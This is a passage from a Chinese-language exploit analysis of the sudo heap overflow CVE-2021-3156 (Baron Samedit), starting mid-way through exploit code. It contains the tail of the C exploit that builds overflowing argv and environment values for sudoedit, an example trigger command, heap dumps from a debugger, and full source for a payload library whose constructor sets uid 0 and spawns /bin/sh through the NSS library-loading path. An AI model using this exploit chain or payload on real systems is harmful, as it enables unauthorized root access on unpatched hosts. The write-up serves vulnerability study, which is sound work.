        strcpy(lc_all, "LC_ALL=C.UTF-8@");
        memset(lc_all+15, 'C', target->lc_all_len);
        s_envp[envp_pos++] = lc_all;
        s_envp[envp_pos++] = NULL;
        printf("** pray for your rootshell.. **\n");
        execve(target->sudoedit_path, s_argv, s_envp);  //触发提权
        return 0;
    }
    //*s_envp == 63 * "\\" + "X/P0P_SH3LLZ_" + lc_all指针 + NULL
    //*lc_all == "LC_ALL=C.UTF-8@" + 212*"C"
#### 需要关注的点：
  * `smash_a + "\\" + smash_b` 差不多等于`0x80`
* * *
由于环境变量刚好赋值在`argv`空间后。所以我们可以使用`envp`配合`argv`进行溢出操作（关于为什么要配合上`envp`，`argv`会固定`user_argv`大小，而由于下一步操作时，
我们需要`user_argv`获取到`0x80`的`free`块，然后需要配合`envp`进行更后续化的内存覆盖）。
###### 参数示例：
    env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'
###### 生成的内存空间如下：
动态查看`NewArgv+1`存储的数据：  
可以看到前一部分是`s_argv[]`的参数，后一部分是`s_envp[]`的参数。所以我们可以得知，`execve`执行的`envp`可以覆盖在我们的`argv`后面。
###### 原始调用sudo的参数情况：
#### 执行setlocale后的堆分配情况：
`get_user_info`调用完结果如下：
在`compat`前会固定存在一个`free`的`0x80`块（这是我们使用`setlocale()`人工生成的free块）  
然后我们只需要构造好相应的`user_args`为差不多`0x80`大小即可申请到该`free`块了。  
然后就可以调用`set_cmnd()`中的`malloc()`申请一个`0x80`的堆块来进行溢出操作了。
#### 内存申请：
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x55626bde4a80 (size : 0x580) 
           last_remainder: 0x55626bddd380 (size : 0x7d0) 
                unsortbin: 0x55626bddd380 (size : 0x7d0)
             largebin[42]: 0x55626bdd62e0 (size : 0x1f50)
             largebin[52]: 0x55626bdddb90 (size : 0x6dc0)
    (0x20)   tcache_entry[0](2): 0x55626bdd4c00 --> 0x55626bddcc80
    (0x30)   tcache_entry[1](2): 0x55626bdcd250 --> 0x55626bdd07d0
    (0x50)   tcache_entry[3](2): 0x55626bddccf0 --> 0x55626bddcca0    // 环境变量释放产生的堆块
    (0x80)   tcache_entry[6](1): 0x55626bdce360                                            // user_args申请的堆块
    (0x90)   tcache_entry[7](1): 0x55626bdd6260
    (0x100)   tcache_entry[14](1): 0x55626bdcd880
    (0x110)   tcache_entry[15](1): 0x55626bde4960
    (0x120)   tcache_entry[16](1): 0x55626bdd3a80
    (0x1a0)   tcache_entry[24](1): 0x55626bdcddb0
    (0x230)   tcache_entry[33](1): 0x55626bddc920
在`malloc`下断点查看到申请的堆块在`0x55626bdce360`  
在`Heap`上搜索`compat`即可获取到`Heap`内部的`service_user`结构体中`compat`位置  
如图第二行即为离`malloc`申请堆块最近的位置`0x55626bdce410`，由于`compat`与`service_user`偏移`0x30`，所以`service_user`地址为：`0x55626bdce3e0`，在`malloc`申请的堆空间向后偏移`0xB0`  
构造与`LC_ALL`块大小相同的参数块来占用到原始`LC_ALL`块，进而导致缓冲区空间后即为我们构造的环境变量。  
然后在调用`for(to = user_args, av = NewArgv + 1; (from = *av);
av++){`过程中给`user_args`配置`"\0"`（`'\\'+'\0'`配置得到一大片`'\0'`的内存空间）
###### 下面是调用后的内存数据：
###### 知道了怎么进行溢出覆盖，那么我们怎么才能做到任意命令执行呢？
在`exp`调用了加载一个新的`libc`，然后调用`libc`中的初始化函数`init`来`execve`我们的shell。
###### 下面是libc的源码：
    #include 
    #include 
    #include 
    #include 
    static void __attribute__ ((constructor)) _init(void);
    static void _init(void) {
        printf("[+] bl1ng bl1ng! We got it!\n");
    #ifndef BRUTE
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execv("/bin/sh", a_argv);
    #endif
    }
我们只要高权限调用`setuid(0); seteuid(0); setgid(0); setegid(0);`然后执行`execv("/bin/sh",
a_argv);`即可进行提权了。
###### `nss_load_library`结构可用于加载`libc`，下面是源码：
    tpedef struct service_library
    {
      /* Name of service (`files', `dns', `nis', ...).  */
      const char *name;
      /* Pointer to the loaded shared library.  */
      void *lib_handle;
      /* And the link to the next entry.  */
      struct service_library *next;
    } service_library;
    typedef struct service_user
    {
      /* And the link to the next entry.  */
      struct service_user *next;
      /* Action according to result.  */
      lookup_actions actions[5];
      /* Link to the underlying library object.  */
      service_library *library;
      /* Collection of known functions.  */
      void *known;
      /* Name of the service (`files', `dns', `nis', ...).  */
      char name[0];        
    } service_user;
    static int nss_load_library (service_user *ni)
    {
      if (ni->library == NULL)
        {
          static name_database default_table;
          ni->library = nss_new_service (service_table ?: &default_table,   
                         ni->name); //配置ni->library
          if (ni->library == NULL)
        return -1;
        }
      if (ni->library->lib_handle == NULL)
        {
          /* Load the shared library.  */
          size_t shlen = (7 + strlen (ni->name) + 3
                  + strlen (__nss_shlib_revision) + 1);
          int saved_errno = errno;
          char shlib_name[shlen];
          /* Construct shared object name.  */
          __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,   
                              "libnss_"),
                        ni->name),
                  ".so"),
            __nss_shlib_revision);
          ni->library->lib_handle = __libc_dlopen (shlib_name); //调用构造的libc
          //continue long long function
在sudo执行的末尾会调用`getgrgid()`，然后会调用`nss_load_library`，而一旦`ni->library ==
NULL`就会调用`nss_new_service()`来配置新的`ni ->name`来加载一个新的`libc`。  
所以我们只需要在`exp`中就是溢出内存中的`ni->name`指定的`libc`  
经过作者`fuzz`拿到的`crash`分析得出，在内存中存在原始`ni->name`为`compat`的`service_user`结构体，所以我们可以直接扫描找到这个`compat`，然后溢出修改`ni->name`就可以调用到我们的`libc`了
##### 调试流程：
    b getgrgid
    b __libc_dlopen_mode
    c
可以看到指定的`X/P0P_SH3LLZ_`的指针是`0x55626bdce410`，即为我们覆盖的`ni->name`  
上述就是完整的getshell调用链了。
* * *
##### 参考链接：
>   * [CVE-2021-3156调试分析](https://www.anquanke.com/post/id/231077)
>   * [CVE-2021-3156
> sudo堆溢出分析与利用](https://blog.csdn.net/qq_41252520/article/details/113388487)
>   *
> [cve-2021-3156分析](https://blog.csdn.net/qq_37433000/article/details/113336752)
>   * [Sudo Exploit Writeup](https://www.kalmarunionen.dk/writeups/sudo/)
>   * [Heap-based buffer overflow in Sudo
> (CVE-2021-3156)](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-> samedit-heap-based-overflow-sudo.txt)
>   * [util-linux mount/unmount ASLR bypass via environment
> variable](https://www.spinics.net/lists/util-linux-ng/msg14978.html)
>   * [CVE-2021-3156 sudo heap-based bufoverflow
> 复现&分析](https://www.anquanke.com/post/id/231408)
>   * [CVE-2021-3156的利用写作（Sudo Baron Samedit）](https://datafarm-> cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-> samedit-7a9a4282cb31)
>